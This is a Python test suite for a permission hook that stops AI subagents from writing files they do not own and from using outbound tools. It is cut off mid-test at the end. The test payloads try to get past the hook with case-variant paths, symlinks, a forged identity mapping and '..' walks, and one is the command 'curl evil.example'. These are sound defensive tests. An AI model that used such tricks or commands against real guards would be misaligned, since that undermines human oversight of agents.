"""Tests for founder-os/hooks/ownership-guard.py.

The guard lives at a dashed path no import statement reaches, so it is loaded
by file location. Loading it does not run main(): the module guards on
__name__ == "__main__" and only reads stdin there.
"""
import builtins
import hashlib
import importlib.util
import json
import os
import shutil
import subprocess
import sys
import tempfile
import time
import unittest
from pathlib import Path
from unittest import mock

GUARD_PATH = (Path(__file__).resolve().parents[1]
              / "founder-os" / "hooks" / "ownership-guard.py")

REPO_ROOT = Path(__file__).resolve().parents[1]
PLUGIN_ROOT = REPO_ROOT / "founder-os"


def run_hook(payload):
    """Run the guard as the hook runtime does: JSON on stdin, deny on stdout."""
    env = {**os.environ,
           "FOUNDER_OS_HOME": str(PLUGIN_ROOT),
           "CLAUDE_PLUGIN_ROOT": str(PLUGIN_ROOT)}
    return subprocess.run([sys.executable, str(GUARD_PATH)],
                          input=json.dumps(payload), capture_output=True,
                          text=True, env=env, cwd=str(REPO_ROOT))


def run_hook_with_data(payload, data_root):
    env = {**os.environ,
           "FOUNDER_OS_HOME": str(PLUGIN_ROOT),
           "CLAUDE_PLUGIN_ROOT": str(PLUGIN_ROOT),
           "CLAUDE_PLUGIN_DATA": str(data_root)}
    return subprocess.run([sys.executable, str(GUARD_PATH)],
                          input=json.dumps(payload), capture_output=True,
                          text=True, env=env, cwd=str(REPO_ROOT))


def load_guard():
    spec = importlib.util.spec_from_file_location("ownership_guard", GUARD_PATH)
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


class TestLazyYamlImport(unittest.TestCase):
    def test_loading_guard_does_not_import_yaml(self):
        imported = []
        real_import = builtins.__import__

        def tracked_import(name, *args, **kwargs):
            if name == "yaml" or name.startswith("yaml."):
                imported.append(name)
            return real_import(name, *args, **kwargs)

        with mock.patch("builtins.__import__", side_effect=tracked_import):
            load_guard()

        self.assertEqual(imported, [])

class TestOwnerOfCasefold(unittest.TestCase):
    BY_PATH = {
        "goals.md": "strategist",
        "drafts/outreach/": "pipeline-coach",
        "drafts/": "nobody-broader",   # longest match must still win
    }

    def setUp(self):
        self.guard = load_guard()

    def test_exact_match_still_works(self):
        self.assertEqual(self.guard.owner_of("goals.md", self.BY_PATH),
                         "strategist")

    def test_file_case_variant_is_the_same_file(self):
        self.assertEqual(self.guard.owner_of("Goals.md", self.BY_PATH),
                         "strategist")
        self.assertEqual(self.guard.owner_of("GOALS.MD", self.BY_PATH),
                         "strategist")

    def test_directory_case_variant_is_the_same_directory(self):
        self.assertEqual(
            self.guard.owner_of("Drafts/Outreach/2026-07-16-anna.md",
                                self.BY_PATH),
            "pipeline-coach")

    def test_longest_match_survives_casefold(self):
        self.assertEqual(
            self.guard.owner_of("DRAFTS/OUTREACH/x.md", self.BY_PATH),
            "pipeline-coach")

    def test_uncovered_path_still_returns_none(self):
        self.assertIsNone(self.guard.owner_of("scratch.md", self.BY_PATH))


class TestHookIntegration(unittest.TestCase):
    def test_symlink_outside_workspace_to_owned_file_is_denied(self):
        import tempfile
        with tempfile.TemporaryDirectory() as td:
            root = Path(td) / "founder-os"
            root.mkdir()
            (root / "references").mkdir()
            (root / "references" / "ownership.yaml").write_text(
                "owns:\n  strategist:\n    - goals.md\n", encoding="utf-8")
            owned = root / "goals.md"
            owned.write_text("", encoding="utf-8")
            outside = Path(td) / "linked-goals.md"
            outside.symlink_to(owned)
            env = {**os.environ,
                   "FOUNDER_OS_HOME": str(root),
                   "CLAUDE_PLUGIN_ROOT": str(root)}
            payload = {"agent_type": "pipeline-coach", "tool_name": "Write",
                       "cwd": str(root),
                       "tool_input": {"file_path": str(outside)}}
            result = subprocess.run(
                [sys.executable, str(GUARD_PATH)],
                input=json.dumps(payload), capture_output=True, text=True,
                env=env, cwd=str(REPO_ROOT))
        self.assertIn("deny", result.stdout)

    def test_notebookedit_by_wrong_agent_is_denied(self):
        p = run_hook({"agent_type": "pipeline-coach",
                      "tool_name": "NotebookEdit",
                      "cwd": str(REPO_ROOT),
                      "tool_input": {
                          "notebook_path": str(PLUGIN_ROOT / "goals.md")}})
        self.assertIn("deny", p.stdout, p.stderr)

    def test_write_case_bypass_is_denied(self):
        p = run_hook({"agent_type": "pipeline-coach",
                      "tool_name": "Write",
                      "cwd": str(REPO_ROOT),
                      "tool_input": {
                          "file_path": str(PLUGIN_ROOT / "Goals.md")}})
        self.assertIn("deny", p.stdout)

    def test_main_thread_is_always_allowed(self):
        p = run_hook({"tool_name": "NotebookEdit",
                      "cwd": str(REPO_ROOT),
                      "tool_input": {
                          "notebook_path": str(PLUGIN_ROOT / "goals.md")}})
        self.assertEqual(p.stdout.strip(), "")
        self.assertEqual(p.returncode, 0)


class TestAgentTypeFor(unittest.TestCase):
    def setUp(self):
        self.guard = load_guard()

    def test_missing_plugin_data_returns_none(self):
        with mock.patch.dict(os.environ, {}, clear=True):
            self.assertIsNone(self.guard._mapped_agent_type("agent.a-1"))

    def test_missing_mapping_returns_none(self):
        with mock.patch.dict(os.environ, {"CLAUDE_PLUGIN_DATA": "/tmp/no-such-data"},
                             clear=False):
            self.assertIsNone(self.guard._mapped_agent_type("agent.a-1"))

    def test_mapping_symlink_is_not_trusted_as_subagent_identity(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            root = Path(temp_dir)
            mapping = root / "agent-types"
            mapping.mkdir()
            source = root / "forged.json"
            source.write_text('{"agent_type":"cfo"}\n', encoding="utf-8")
            (mapping / "agent.a-1.json").symlink_to(source)
            with mock.patch.dict(
                os.environ,
                {"CLAUDE_PLUGIN_DATA": temp_dir},
                clear=False,
            ):
                resolved = self.guard._mapped_agent_type("agent.a-1")

        self.assertIsNone(resolved)

    NOW = 1_800_000_000.0

    def _mapping_aged(self, age):
        with tempfile.TemporaryDirectory() as temp_dir:
            mapping = Path(temp_dir) / "agent-types"
            mapping.mkdir()
            (mapping / "agent.old.json").write_text(
                json.dumps(
                    {"agent_type": "cfo", "recorded_at": self.NOW - age}
                ),
                encoding="utf-8",
            )
            with mock.patch.dict(
                os.environ, {"CLAUDE_PLUGIN_DATA": temp_dir}, clear=False
            ), mock.patch.object(self.guard.time, "time",
                                 return_value=self.NOW):
                return self.guard._mapped_agent_type("agent.old")

    def test_mapping_older_than_twenty_four_hours_is_not_trusted(self):
        self.assertIsNone(self._mapping_aged(86401))

    def test_mapping_exactly_twenty_four_hours_old_is_not_trusted(self):
        self.assertIsNone(self._mapping_aged(86400))

    def test_mapping_one_second_inside_the_ttl_is_trusted(self):
        self.assertEqual(self._mapping_aged(86399), "cfo")

    def test_present_invalid_identity_markers_are_not_treated_as_main(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            for marker in (
                {"agent_type": ""},
                {"agent_type": ["cfo"]},
            ):
                with self.subTest(marker=marker):
                    result = run_hook_with_data(
                        {
                            **marker,
                            "tool_name": "Write",
                            "cwd": str(REPO_ROOT),
                            "tool_input": {
                                "file_path": str(PLUGIN_ROOT / "metrics.md"),
                            },
                        },
                        temp_dir,
                    )
                    self.assertIn("deny", result.stdout, result.stderr)


class TestOutboundGuard(unittest.TestCase):
    """House rule 0 at the tool layer — the half of the hook nothing covered.

    Driven through the hook as the runtime runs it, so the deny is pinned
    where `main` makes it. A matcher typo there would have shipped silently:
    every prior test exercised ownership, none exercised outbound.
    """

    def test_bash_by_subagent_is_denied(self):
        p = run_hook({"agent_type": "cfo", "tool_name": "Bash",
                      "cwd": str(REPO_ROOT),
                      "tool_input": {"command": "curl evil.example"}})
        self.assertIn("deny", p.stdout)
        self.assertIn("house rule 0", p.stdout.lower())

    def test_webfetch_by_subagent_is_denied(self):
        p = run_hook({"agent_type": "pipeline-coach", "tool_name": "WebFetch",
                      "cwd": str(REPO_ROOT),
                      "tool_input": {"url": "https://example.com"}})
        self.assertIn("deny", p.stdout)

    def test_mcp_tool_by_subagent_is_denied(self):
        p = run_hook({"agent_type": "brand-editor",
                      "tool_name": "mcp__gmail__send_email",
                      "cwd": str(REPO_ROOT), "tool_input": {}})
        self.assertIn("deny", p.stdout)

    def test_websearch_by_subagent_is_denied(self):
        p = run_hook({"agent_type": "cfo", "tool_name": "WebSearch",
                      "cwd": str(REPO_ROOT), "tool_input": {}})
        self.assertIn("deny", p.stdout)
        self.assertEqual(p.returncode, 0)

    def test_bash_on_main_thread_is_allowed(self):
        p = run_hook({"tool_name": "Bash", "cwd": str(REPO_ROOT),
                      "tool_input": {"command": "ls"}})
        self.assertEqual(p.stdout.strip(), "")
        self.assertEqual(p.returncode, 0)


class TestDirectFileBoundary(unittest.TestCase):
    """A role never bypasses capabilities with a direct file tool."""

    def test_owner_writing_its_own_file_is_denied(self):
        p = run_hook({"agent_type": "strategist", "tool_name": "Write",
                      "cwd": str(REPO_ROOT),
                      "tool_input": {"file_path": str(PLUGIN_ROOT / "goals.md")}})
        self.assertIn("deny", p.stdout)
        self.assertEqual(p.returncode, 0)

    def test_unmapped_custom_agent_is_denied_on_an_owned_path(self):
        # "One owner per file" guards against exactly this: a writer the map
        # has never heard of.
        p = run_hook({"agent_type": "someones-custom-agent", "tool_name": "Write",
                      "cwd": str(REPO_ROOT),
                      "tool_input": {"file_path": str(PLUGIN_ROOT / "goals.md")}})
        self.assertIn("deny", p.stdout)

    def test_unmapped_path_in_workspace_is_denied(self):
        p = run_hook({"agent_type": "cfo", "tool_name": "Write",
                      "cwd": str(REPO_ROOT),
                      "tool_input": {"file_path": str(PLUGIN_ROOT / "scratch.md")}})
        self.assertIn("deny", p.stdout)
        self.assertEqual(p.returncode, 0)

    def test_role_write_to_the_derived_directory_is_the_direct_file_deny(self):
        # A role never reaches the ownership map at all, so this pins the
        # mechanism that actually denies it rather than implying the map did.
        # What `derived_files:` denies is in TestDerivedFilesAreNotWritable.
        for role in ("cfo", "chief-of-staff", "ops-engineer"):
            p = run_hook({"agent_type": role, "tool_name": "Write",
                          "cwd": str(REPO_ROOT),
                          "tool_input": {
                              "file_path": str(PLUGIN_ROOT / "_dashboard"
                                               / "notes.md")}})
            self.assertIn("deny", p.stdout, role)
            self.assertIn("Direct local file access", p.stdout, role)

    def test_path_outside_workspace_is_denied(self):
        p = run_hook({"agent_type": "cfo", "tool_name": "Write",
                      "cwd": str(REPO_ROOT),
                      "tool_input": {"file_path": "/tmp/elsewhere.md"}})
        self.assertIn("deny", p.stdout)
        self.assertEqual(p.returncode, 0)


class TestDerivedEntryMatching(unittest.TestCase):
    """`derived_files:` entries match by path segment, not by string prefix."""

    ENTRIES = ("_dashboard/",)

    def setUp(self):
        self.guard = load_guard()

    def _entry(self, rel):
        return self.guard._derived_entry(rel, self.ENTRIES)

    def test_a_file_under_the_directory_matches(self):
        self.assertEqual(self._entry("_dashboard/notes.md"), "_dashboard/")
        self.assertEqual(self._entry("_dashboard/a/b/snapshots.csv"),
                         "_dashboard/")

    def test_the_directory_itself_matches(self):
        self.assertEqual(self._entry("_dashboard"), "_dashboard/")

    def test_a_longer_name_sharing_the_prefix_does_not_match(self):
        self.assertIsNone(self._entry("_dashboard_secrets.md"))
        self.assertIsNone(self._entry("_dashboardish/x.md"))
        self.assertIsNone(self._entry("_dashboard.md"))

    def test_a_name_containing_the_entry_does_not_match(self):
        self.assertIsNone(self._entry("archive/_dashboard/notes.md"))
        self.assertIsNone(self._entry("my_dashboard/notes.md"))

    def test_matching_is_casefolded_like_owner_of(self):
        self.assertEqual(self._entry("_DASHBOARD/Notes.md"), "_dashboard/")

    def test_an_entry_written_without_its_slash_still_covers_the_tree(self):
        self.assertEqual(
            self.guard._derived_entry("_dashboard/notes.md", ("_dashboard",)),
            "_dashboard")
        self.assertIsNone(
            self.guard._derived_entry("_dashboardish/x.md", ("_dashboard",)))

    def test_no_entries_means_no_match(self):
        self.assertIsNone(self.guard._derived_entry("_dashboard/notes.md", ()))


class TestDerivedFilesAreParsedByThePackageParser(unittest.TestCase):
    """`derived_files:` the guard cannot read is no derived path, not a deny."""

    def setUp(self):
        self.guard = load_guard()

    def test_an_absent_key_is_no_derived_paths_rather_than_an_error(self):
        self.assertEqual(self.guard._derived_from_text(
            "owns:\n  cfo:\n    - m.md\n", "x"), ())
        self.assertEqual(self.guard._derived_from_text("owns: {}\n", "x"), ())

    def test_a_shape_it_does_not_understand_yields_no_deny(self):
        for text in ("derived_files:\n  nested:\n    - x\n",
                     "derived_files: _dashboard/\n",
                     "derived_files: {a: b}\n",
                     "derived_files: ['unterminated\n"):
            with self.subTest(text=text):
                self.assertEqual(self.guard._derived_from_text(text, "x"), ())

    def test_a_broken_owns_key_leaves_derived_files_readable(self):
        text = ("derived_files:\n  - _dashboard/\n"
                "owns:\n  - a list where the agents should be\n")
        self.assertEqual(self.guard._derived_from_text(text, "x"),
                         ("_dashboard/",))
        self.assertIsNone(self.guard._owns_from_text(text, "x"))


class TestDerivedFilesAreNotWritable(unittest.TestCase):
    """A derived path is denied to the agents that reach the ownership map.

    The thirteen roles never reach it — `main` denies them every direct file
    tool first — so a role payload can say nothing about `derived_files:`. The
    branch that consults the map is the non-role one: a reviewer, an Explore
    pass, another plugin's agent. Every test here drives that branch against a
    map it can mutate, so that deleting the key, or granting the path an owner,
    changes the answer.
    """

    MAP = (
        "workspace_files:\n"
        "  - goals.md\n"
        "derived_files:\n"
        "  - _dashboard/\n"
        "owns:\n"
        "  strategist:\n"
        "    - goals.md\n"
    )
    WITHOUT_KEY = MAP.replace("derived_files:\n  - _dashboard/\n", "", 1)
    BROKEN_OWNS = MAP.replace("owns:\n  strategist:\n    - goals.md\n",
                              "owns:\n  - a list where the agents should be\n", 1)

    def _run(self, map_text, payload_path, agent_type="explore",
             tool_name="Write", cwd=None, tool_input=None, prepare=None):
        tmp = Path(tempfile.mkdtemp())
        self.addCleanup(shutil.rmtree, str(tmp), True)
        plugin = tmp / "plugin"
        (plugin / "hooks").mkdir(parents=True)
        (plugin / "references").mkdir()
        guard = plugin / "hooks" / "ownership-guard.py"
        shutil.copy(GUARD_PATH, guard)
        (plugin / "mcp").mkdir()
        shutil.copy(PLUGIN_ROOT / "mcp" / "ownership.py", plugin / "mcp")
        (plugin / "references" / "ownership.yaml").write_text(
            map_text, encoding="utf-8")
        ws = tmp / "ws"
        ws.mkdir()
        if prepare is not None:
            prepare(ws)
        if tool_input is None:
            tool_input = {"file_path": "%s/%s" % (ws, payload_path)}
        env = {**os.environ, "CLAUDE_PLUGIN_ROOT": str(plugin),
               "FOUNDER_OS_HOME": str(ws)}
        return subprocess.run(
            [sys.executable, str(guard)],
            input=json.dumps({"agent_type": agent_type,
                              "tool_name": tool_name,
                              "cwd": str(ws if cwd is None else cwd),
                              "tool_input": tool_input}),
            capture_output=True, text=True, env=env, cwd=str(tmp))

    def test_a_non_role_agent_may_not_write_a_derived_path(self):
        p = self._run(self.MAP, "_dashboard/notes.md")
        self.assertIn("deny", p.stdout, p.stderr)
        self.assertIn("derived_files", p.stdout)
        self.assertEqual(p.returncode, 0)

    def test_the_deny_names_no_owner_to_hand_off_to(self):
        # Nobody owns a derived path, so there is nobody to route the edit to.
        # The deny has to be asserted alongside the absent handoff: an allow
        # prints nothing, and nothing contains no handoff either.
        p = self._run(self.MAP, "_dashboard/notes.md")
        self.assertIn("deny", p.stdout, p.stderr)
        self.assertNotIn("Hand off to", p.stdout)

    def test_the_deny_claims_only_the_boundary_the_hook_enforces(self):
        # The hook sees tools that name a path. A shell command names none, so
        # the message says which writes it is speaking about instead of
        # promising an absolute the mechanism does not deliver. "A file tool"
        # was still a class wider than the mechanism: it reads four tools and
        # hands every other one no path at all, so the four are named.
        p = self._run(self.MAP, "_dashboard/notes.md")
        for tool in ("Write", "Edit", "MultiEdit", "NotebookEdit"):
            self.assertIn("`%s`" % tool, p.stdout, tool)
        self.assertNotIn("with a file tool", p.stdout)

    def test_the_deny_names_a_tool_exactly_when_the_guard_reads_its_paths(self):
        # Both directions, so the sentence cannot drift from the mechanism:
        # adding a tool to `_tool_paths` without the deny text understates the
        # rule, and naming one it cannot read overstates it.
        guard = load_guard()
        p = self._run(self.MAP, "_dashboard/notes.md")
        payload = {"file_path": "/tmp/ws/_dashboard/x.md"}
        for tool in ("Write", "Edit", "NotebookEdit",
                     "MultiEdit", "Bash", "Read", "Glob", "Task"):
            with self.subTest(tool=tool):
                self.assertEqual(bool(guard._tool_paths(tool, payload)),
                                 ("`%s`" % tool) in p.stdout)

    def test_a_symlinked_derived_directory_is_still_denied(self):
        # `resolve_in_workspace` answers with the realpath, which is right for
        # ownership and wrong here: `_dashboard/` pointed at a sibling inside
        # the same workspace used to be judged under the sibling's name, so an
        # agent that can create a symlink could write the rendered tree and be
        # told only that the target has no owner.
        def prepare(ws):
            (ws / "real").mkdir()
            os.symlink(str(ws / "real"), str(ws / "_dashboard"))

        p = self._run(self.MAP, "_dashboard/notes.md", prepare=prepare)
        self.assertIn("deny", p.stdout, p.stderr)
        self.assertIn("derived_files", p.stdout)
        self.assertEqual(p.returncode, 0)

    def test_a_symlink_pointing_at_a_neighbour_is_not_denied_by_its_target(self):
        # The other direction of the same change: checking both names must not
        # start denying a path neither name is derived.
        def prepare(ws):
            (ws / "real").mkdir()
            os.symlink(str(ws / "real"), str(ws / "scratch"))

        p = self._run(self.MAP, "scratch/notes.md", prepare=prepare)
        self.assertEqual(p.stdout.strip(), "", p.stdout)
        self.assertEqual(p.returncode, 0)

    def test_an_unusable_owns_key_does_not_switch_the_derived_deny_off(self):
        # `check_ownership` fails open when `owns:` will not parse, and the
        # derived check runs before that allow. The deny text says the rule
        # cannot be granted by a map edit; this is the map edit that used to
        # grant it anyway.
        p = self._run(self.BROKEN_OWNS, "_dashboard/notes.md")
        self.assertIn("deny", p.stdout, p.stderr)
        self.assertIn("derived_files", p.stdout)
        self.assertEqual(p.returncode, 0)

    def test_an_unusable_owns_key_still_fails_open_everywhere_else(self):
        # The derived check moved above the bail; nothing else did. A map this
        # guard cannot read is still not evidence that an ordinary write, or a
        # write to the founder's own overlay, is wrong.
        for rel in ("goals.md", "_local/ownership.yaml", "scratch.md"):
            with self.subTest(rel=rel):
                p = self._run(self.BROKEN_OWNS, rel)
                self.assertEqual(p.stdout.strip(), "", p.stdout)
                self.assertEqual(p.returncode, 0)

    def test_deleting_the_key_from_the_map_restores_the_allow(self):
        # The falsifiability pin: without this, every assertion above would
        # still pass against a guard that had never heard of `derived_files:`
        # and was denying `_dashboard/` for some other reason.
        p = self._run(self.WITHOUT_KEY, "_dashboard/notes.md")
        self.assertEqual(p.stdout.strip(), "", p.stdout)
        self.assertEqual(p.returncode, 0)

    def test_giving_the_derived_path_an_owner_does_not_grant_it(self):
        # The deny must not be reachable through the ownership map, including
        # by an entry naming the writing agent itself.
        granted = self.MAP.replace(
            "  strategist:\n    - goals.md\n",
            "  strategist:\n    - goals.md\n  explore:\n    - _dashboard/\n", 1)
        p = self._run(granted, "_dashboard/notes.md")
        self.assertIn("deny", p.stdout, p.stderr)
        self.assertIn("derived_files", p.stdout)

    def test_a_neighbouring_name_that_shares_the_prefix_is_still_allowed(self):
        for rel in ("_dashboard_secrets.md", "_dashboardish/x.md"):
            p = self._run(self.MAP, rel)
            self.assertEqual(p.stdout.strip(), "", rel)
            self.assertEqual(p.returncode, 0, rel)

    def test_a_dot_dot_walk_cannot_escape_or_enter_unnoticed(self):
        out = self._run(self.MAP, "_dashboard/../scratch.md")
        self.assertEqual(out.stdout.strip(), "", out.stdout)
        into = self._run(self.MAP, "notes/../_dashboard/x.md")
        self.assertIn("deny", into.stdout, into.stderr)

    def test_nested_files_are_covered_not_just_the_top_level(self):
        p = self._run(self.MAP, "_dashboard/history/snapshots.csv")
        self.assertIn("deny", p.stdout, p.stderr)

    def test_edit_is_bound_as_well_as_write(self):
        p = self._run(self.MAP, "_dashboard/index.html", tool_name="Edit")
        self.assertIn("deny", p.stdout, p.stderr)

    def test_multiedit_is_bound_like_edit(self):
        # SEC-01: MultiEdit names its target the way Edit does; a host that
        # still ships it must not get a path-free pass on any of the denies.
        for rel, reason in (("_dashboard/index.html", "derived_files"),
                            ("goals.md", "Hand off to"),
                            ("_local/ownership.yaml", "local overlay")):
            with self.subTest(rel=rel):
                p = self._run(self.MAP, rel, tool_name="MultiEdit")
                self.assertIn("deny", p.stdout, p.stderr)
                self.assertIn(reason, p.stdout)

    def test_a_relative_path_resolves_against_the_session_cwd(self):
        p = self._run(
            self.MAP, None, tool_input={"file_path": "_dashboard/notes.md"})
        self.assertIn("deny", p.stdout, p.stderr)

    def test_an_owned_path_still_denies_with_the_ownership_reason(self):
        # The new check must not swallow the deny it sits in front of.
        p = self._run(self.MAP, "goals.md")
        self.assertIn("deny", p.stdout, p.stderr)
        self.assertIn("Hand off to", p.stdout)

    def test_an_ordinary_unowned_path_is_still_allowed(self):
        p = self._run(self.MAP, "scratch.md")
        self.assertEqual(p.stdout.strip(), "", p.stdout)
        self.assertEqual(p.returncode, 0)

    def test_the_packaged_map_denies_the_dashboard_directory(self):
        p = run_hook({"agent_type": "explore", "tool_name": "Write",
                      "cwd": str(REPO_ROOT),
                      "tool_input": {
                          "file_path": str(PLUGIN_ROOT / "_dashboard"
                                           / "snapshots.csv")}})
        self.assertIn("deny", p.stdout, p.stderr)
        self.assertIn("derived_files", p.stdout)


class TestFailOpen(unittest.TestCase):
    """Allow, loudly. A guard that denies because it lost its own config is
    not safe, it is broken — the docstring's whole product decision."""

    def test_garbage_stdin_is_allowed(self):
        env = {**os.environ, "CLAUDE_PLUGIN_ROOT": str(PLUGIN_ROOT)}
        p = subprocess.run([sys.executable, str(GUARD_PATH)],
                           input="this is not json", capture_output=True,
                           text=True, env=env, cwd=str(REPO_ROOT))
        self.assertEqual(p.stdout.strip(), "")
        self.assertEqual(p.returncode, 0)

    def test_missing_ownership_map_does_not_enable_direct_role_writes(self):
        import shutil
        import tempfile
        tmp = Path(tempfile.mkdtemp())
        try:
            (tmp / "plugin" / "hooks").mkdir(parents=True)
            guard = tmp / "plugin" / "hooks" / "ownership-guard.py"
            shutil.copy(GUARD_PATH, guard)
            ws = tmp / "ws"
            ws.mkdir()
            env = {**os.environ, "CLAUDE_PLUGIN_ROOT": str(tmp / "plugin"),
                   "FOUNDER_OS_HOME": str(ws)}
            p = subprocess.run(
                [sys.executable, str(guard)],
                input=json.dumps({"agent_type": "cfo", "tool_name": "Write",
                                  "cwd": str(tmp),
                                  "tool_input": {"file_path": str(ws / "goals.md")}}),
                capture_output=True, text=True, env=env, cwd=str(tmp))
            self.assertIn("deny", p.stdout)
            self.assertEqual(p.returncode, 0)
        finally:
            shutil.rmtree(tmp, ignore_errors=True)


class TestMapParityWithPyYAML(unittest.TestCase):
    """The guard reads the maps the way PyYAML reads them — with or without it.

    PyYAML is the oracle because it is what the guard used whenever it was
    installed. The guard must reach the same `owns:` and `derived_files:`
    answer for the packaged map and for an overlay, and reach it on a machine
    where `import yaml` fails.
    """

    OVERLAY = (
        "# founder's own files\n"
        "owns:\n"
        "  network-manager:\n"
        "    - partners.md  # weekly\n"
        "    - \"notes/partners/\"\n"
        "  skills-mentor:\n"
        "    - 'learning.md'\n"
    )

    @staticmethod
    def _flatten(owns):
        return {path.strip(): agent for agent, paths in owns.items()
                for path in paths}

    def _without_yaml(self, call):
        real_import = builtins.__import__

        def no_yaml(name, *args, **kwargs):
            if name == "yaml" or name.startswith("yaml."):
                raise ImportError("no PyYAML here")
            return real_import(name, *args, **kwargs)

        with mock.patch.dict(sys.modules, {"yaml": None}), \
                mock.patch("builtins.__import__", side_effect=no_yaml):
            return call(load_guard())

    def test_the_packaged_map_matches_pyyaml(self):
        import yaml
        text = (PLUGIN_ROOT / "references" / "ownership.yaml").read_text(
            encoding="utf-8")
        data = yaml.safe_load(text)
        with mock.patch.dict(os.environ,
                             {"CLAUDE_PLUGIN_ROOT": str(PLUGIN_ROOT)}):
            for label, read in (("with", lambda call: call(load_guard())),
                                ("without", self._without_yaml)):
                with self.subTest(pyyaml=label):
                    self.assertEqual(
                        read(lambda guard: guard.load_ownership()),
                        self._flatten(data["owns"]))
                    self.assertEqual(
                        read(lambda guard: guard.load_derived()),
                        tuple(data["derived_files"]))

    def test_an_overlay_matches_pyyaml(self):
        import yaml
        expected = self._flatten(yaml.safe_load(self.OVERLAY)["owns"])
        with tempfile.TemporaryDirectory() as td:
            (Path(td) / "_local").mkdir()
            (Path(td) / "_local" / "ownership.yaml").write_text(
                self.OVERLAY, encoding="utf-8")
            for label, read in (("with", lambda call: call(load_guard())),
                                ("without", self._without_yaml)):
                with self.subTest(pyyaml=label):
                    self.assertEqual(
                        read(lambda guard: guard.local_ownership(td)),
                        expected)


class TestOwnershipHotPath(unittest.TestCase):
    def test_workspace_roots_are_computed_once_per_invocation(self):
        guard = load_guard()
        with mock.patch.object(guard, "load_ownership", return_value={}), \
                mock.patch.object(guard, "workspace_roots", return_value=[] ) as roots:
            guard.check_ownership("cfo", "Write", {
                "file_path": "/tmp/workspace/a.md"}, "/tmp/workspace")
        roots.assert_called_once_with("/tmp/workspace", registry=False)

    def test_an_in_root_write_does_not_load_the_registry(self):
        # PERF-01: the registry costs an import of mcp/workspaces.py on every
        # call, and a target under the primary roots cannot need it.
        guard = load_guard()
        with tempfile.TemporaryDirectory() as td:
            ws = Path(td).resolve() / "founder-os"
            ws.mkdir()
            with mock.patch.dict(os.environ, {"FOUNDER_OS_HOME": str(ws)}), \
                    mock.patch.object(guard, "_registry_roots",
                                      return_value=[]) as registry:
                guard.check_ownership("explore", "Write", {
                    "file_path": str(ws / "scratch.md")}, td)
                registry.assert_not_called()
                guard.check_ownership("explore", "Write", {
                    "file_path": str(Path(td) / "elsewhere.md")}, td)
                registry.assert_called_once_with()

    def test_a_main_thread_call_does_not_import_tempfile(self):
        # PERF-03: tempfile is for binding a generic role and nothing else.
        p = subprocess.run([sys.executable, "-X", "importtime", str(GUARD_PATH)],
                           input=json.dumps({"tool_name": "Read"}),
                           capture_output=True, text=True, cwd=str(REPO_ROOT))
        self.assertEqual(p.stdout.strip(), "")
        self.assertIn("import time:", p.stderr)
        self.assertNotIn("tempfile", p.stderr)

    def test_the_packaged_map_is_read_once_per_invocation(self):
        # PERF-002's discipline with a second consumer on it: `owns:` and
        # `derived_files:` are two reads of one document, and the property that
        # matters is not the saved stat but that they cannot answer from
        # different versions of the file. Rewriting the map between the two
        # calls is how that is stated in a test.
        guard = load_guard()
        tmp = Path(tempfile.mkdtemp())
        self.addCleanup(shutil.rmtree, str(tmp), True)
        (tmp / "references").mkdir()
        map_path = tmp / "references" / "ownership.yaml"
        map_path.write_text(
            "derived_files:\n  - _dashboard/\n"
            "owns:\n  strategist:\n    - goals.md\n", encoding="utf-8")
        with mock.patch.dict(os.environ, {"CLAUDE_PLUGIN_ROOT": str(tmp)}):
            self.assertEqual(guard.load_ownership(), {"goals.md": "strategist"})
            map_path.write_text("owns:\n  strategist:\n    - goals.md\n",
                                encoding="utf-8")
            self.assertEqual(guard.load_derived(), ("_dashboard/",))


class TestWorkspaceRoots(unittest.TestCase):
    def test_relative_founder_os_home_resolves_from_hook_cwd(self):
        import tempfile
        guard = load_guard()
        with tempfile.TemporaryDirectory() as td:
            cwd = Path(td)
            expected = (cwd / "business").resolve()
            with mock.patch.dict(os.environ, {"FOUNDER_OS_HOME": "business",
                                               "CLAUDE_PROJECT_DIR": ""}, clear=False):
                roots = guard.workspace_roots(str(cwd))
            self.assertIn(str(expected), roots)

    def test_tilde_founder_os_home_is_expanded_like_the_gateway(self):
        # security-3 - a literal `~` from settings `env` reaches the hook
        # unexpanded; joined under the cwd it guarded no real workspace.
        import tempfile
        guard = load_guard()
        with tempfile.TemporaryDirectory() as td:
            with mock.patch.dict(os.environ, {"FOUNDER_OS_HOME": "~/biz",
                                               "HOME": td}, clear=False):
                roots = guard.workspace_roots(td)
            self.assertIn(str((Path(td) / "biz").resolve()), roots)
            self.assertFalse(any("~" in root for root in roots), roots)

    def test_missing_founder_os_home_defaults_to_founder_os_under_cwd(self):
        import tempfile
        guard = load_guard()
        with tempfile.TemporaryDirectory() as td:
            with mock.patch.dict(os.environ, {}, clear=True):
                roots = guard.workspace_roots(td)
            self.assertIn(str((Path(td) / "founder-os").resolve()), roots)


class TestRegistryRoots(unittest.TestCase):
    """Multi-business: the registry's workspace roots are guarded too.

    references/multi-business.md: `~/.founder-os/businesses.yaml` lists every
    business workspace plus the portfolio workspace, and a write into any of
    them must be checked against the map — not only the workspace this
    session's FOUNDER_OS_HOME happens to name. Fail-open applies in full: a
    broken registry costs coverage, never a write.
    """

    def _home_with_registry(self, tmp, text):
        home = tmp / "home"
        (home / ".founder-os").mkdir(parents=True)
        (home / ".founder-os" / "businesses.yaml").write_text(
            text, encoding="utf-8")
        return home

    def test_registry_roots_are_candidate_workspaces(self):
        import tempfile
        from unittest import mock
        with tempfile.TemporaryDirectory() as td:
            tmp = Path(td)
            acme = tmp / "acme" / "founder-os"
            portfolio = tmp / "portfolio"
            acme.mkdir(parents=True)
            portfolio.mkdir(parents=True)
            home = self._home_with_registry(tmp, (
                "businesses:\n"
                "  acme:\n"
                "    home: %s\n"
                "    status: active\n"
                "default: acme\n"
                "portfolio: %s\n" % (acme, portfolio)))
            guard = load_guard()
            with mock.patch.dict(os.environ, {"HOME": str(home)}):
                roots = guard.workspace_roots(None)
            self.assertIn(str(acme.resolve()), roots)
            self.assertIn(str(portfolio.resolve()), roots)

    def test_registry_roots_are_parsed_the_gateways_way(self):
        # deadcode-4 - the guard reads the registry with the gateway's
        # `load_registry`, so a `#` inside a path is the path, not a comment,
        # with or without PyYAML. (Was: a second line-scan parser that
        # truncated `biz#2` to `biz`. A registry the gateway rejects, such as
        # one without `status:`, now yields no roots, as it does there.)
        import tempfile
        with tempfile.TemporaryDirectory() as td:
            tmp = Path(td)
            acme = tmp / "acme#2" / "founder-os"
            portfolio = tmp / "portfolio"
